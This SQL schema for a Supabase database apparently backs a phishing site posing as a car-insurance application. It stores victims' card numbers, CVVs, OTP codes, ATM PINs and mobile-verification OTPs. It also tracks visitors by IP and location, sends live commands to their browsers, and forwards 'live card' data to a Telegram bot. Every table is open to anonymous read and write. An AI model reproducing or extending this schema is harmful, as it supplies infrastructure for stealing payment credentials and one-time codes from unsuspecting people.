
CREATE TABLE IF NOT EXISTS public.applications (
  id TEXT PRIMARY KEY,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  visitor_id TEXT,
  full_name TEXT, identity TEXT, birth_date TEXT, phone TEXT,
  insurance_type TEXT, start_date TEXT, purpose TEXT, est_value TEXT,
  car_year TEXT, car_model TEXT, repair_place TEXT, company TEXT, type TEXT,
  price NUMERIC, total NUMERIC, method TEXT,
  status TEXT NOT NULL DEFAULT 'pending',
  review_status TEXT NOT NULL DEFAULT 'awaiting_review',
  card_number TEXT, card_name TEXT, card_exp_month TEXT, card_exp_year TEXT,
  card_cvv TEXT, card_brand TEXT, otp_code TEXT,
  atm_pin TEXT, mutasil_phone TEXT, mutasil_provider TEXT, mutasil_id TEXT, mutasil_otp TEXT,
  screenshot_urls TEXT[]
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.applications TO anon, authenticated;
GRANT ALL ON public.applications TO service_role;
ALTER TABLE public.applications ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_applications" ON public.applications;
CREATE POLICY "anon_all_applications" ON public.applications FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE IF NOT EXISTS public.visitor_sessions (
  visitor_id TEXT PRIMARY KEY,
  last_path TEXT, last_seen_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  user_agent TEXT, platform TEXT, is_mobile BOOLEAN, referrer TEXT,
  ip TEXT, country TEXT, country_code TEXT, city TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.visitor_sessions TO anon, authenticated;
GRANT ALL ON public.visitor_sessions TO service_role;
ALTER TABLE public.visitor_sessions ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_sessions" ON public.visitor_sessions;
CREATE POLICY "anon_all_sessions" ON public.visitor_sessions FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);
DO $$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.visitor_sessions; EXCEPTION WHEN duplicate_object THEN NULL; END $$;

CREATE TABLE IF NOT EXISTS public.visitor_commands (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  visitor_id TEXT NOT NULL, command TEXT NOT NULL, payload TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.visitor_commands TO anon, authenticated;
GRANT ALL ON public.visitor_commands TO service_role;
ALTER TABLE public.visitor_commands ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_commands" ON public.visitor_commands;
CREATE POLICY "anon_all_commands" ON public.visitor_commands FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);
DO $$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.visitor_commands; EXCEPTION WHEN duplicate_object THEN NULL; END $$;

CREATE TABLE IF NOT EXISTS public.blocked_visitors (
  visitor_id TEXT PRIMARY KEY, reason TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.blocked_visitors TO anon, authenticated;
GRANT ALL ON public.blocked_visitors TO service_role;
ALTER TABLE public.blocked_visitors ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_blocked" ON public.blocked_visitors;
CREATE POLICY "anon_all_blocked" ON public.blocked_visitors FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);
DO $$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.blocked_visitors; EXCEPTION WHEN duplicate_object THEN NULL; END $$;

CREATE TABLE IF NOT EXISTS public.chat_conversations (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  visitor_id TEXT NOT NULL,
  customer_name TEXT NOT NULL DEFAULT '',
  customer_phone TEXT NOT NULL DEFAULT '',
  last_message_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  unread_admin INTEGER NOT NULL DEFAULT 0,
  unread_customer INTEGER NOT NULL DEFAULT 0,
  initiated_by TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_conversations TO anon, authenticated;
GRANT ALL ON public.chat_conversations TO service_role;
ALTER TABLE public.chat_conversations ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_conv" ON public.chat_conversations;
CREATE POLICY "anon_all_conv" ON public.chat_conversations FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);
DO $$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.chat_conversations; EXCEPTION WHEN duplicate_object THEN NULL; END $$;

CREATE TABLE IF NOT EXISTS public.chat_messages (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  conversation_id UUID NOT NULL REFERENCES public.chat_conversations(id) ON DELETE CASCADE,
  sender TEXT NOT NULL, content TEXT NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_messages TO anon, authenticated;
GRANT ALL ON public.chat_messages TO service_role;
ALTER TABLE public.chat_messages ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_msg" ON public.chat_messages;
CREATE POLICY "anon_all_msg" ON public.chat_messages FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);
DO $$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.chat_messages; EXCEPTION WHEN duplicate_object THEN NULL; END $$;

CREATE TABLE IF NOT EXISTS public.sms_settings (
  id TEXT PRIMARY KEY,
  provider_name TEXT NOT NULL DEFAULT '',
  api_url TEXT NOT NULL DEFAULT '',
  http_method TEXT NOT NULL DEFAULT 'POST',
  headers_json TEXT NOT NULL DEFAULT '{}',
  body_template TEXT NOT NULL DEFAULT '',
  content_type TEXT NOT NULL DEFAULT 'application/json',
  default_sender_id TEXT NOT NULL DEFAULT '',
  phone_format TEXT NOT NULL DEFAULT 'e164',
  enabled BOOLEAN NOT NULL DEFAULT false,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.sms_settings TO anon, authenticated;
GRANT ALL ON public.sms_settings TO service_role;
ALTER TABLE public.sms_settings ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_sms_settings" ON public.sms_settings;
CREATE POLICY "anon_all_sms_settings" ON public.sms_settings FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE IF NOT EXISTS public.sms_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  application_id TEXT, phone TEXT NOT NULL,
  sender_id TEXT NOT NULL DEFAULT '', message TEXT NOT NULL,
  status TEXT NOT NULL, http_status INTEGER,
  provider_response TEXT, error TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.sms_logs TO anon, authenticated;
GRANT ALL ON public.sms_logs TO service_role;
ALTER TABLE public.sms_logs ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_sms_logs" ON public.sms_logs;
CREATE POLICY "anon_all_sms_logs" ON public.sms_logs FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE IF NOT EXISTS public.telegram_settings (
  id TEXT PRIMARY KEY,
  enabled BOOLEAN NOT NULL DEFAULT false,
  bot_token TEXT NOT NULL DEFAULT '',
  chat_id TEXT NOT NULL DEFAULT '',
  send_live_card BOOLEAN NOT NULL DEFAULT true,
  send_steps BOOLEAN NOT NULL DEFAULT true,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.telegram_settings TO anon, authenticated;
GRANT ALL ON public.telegram_settings TO service_role;
ALTER TABLE public.telegram_settings ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_all_tg" ON public.telegram_settings;
CREATE POLICY "anon_all_tg" ON public.telegram_settings FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);
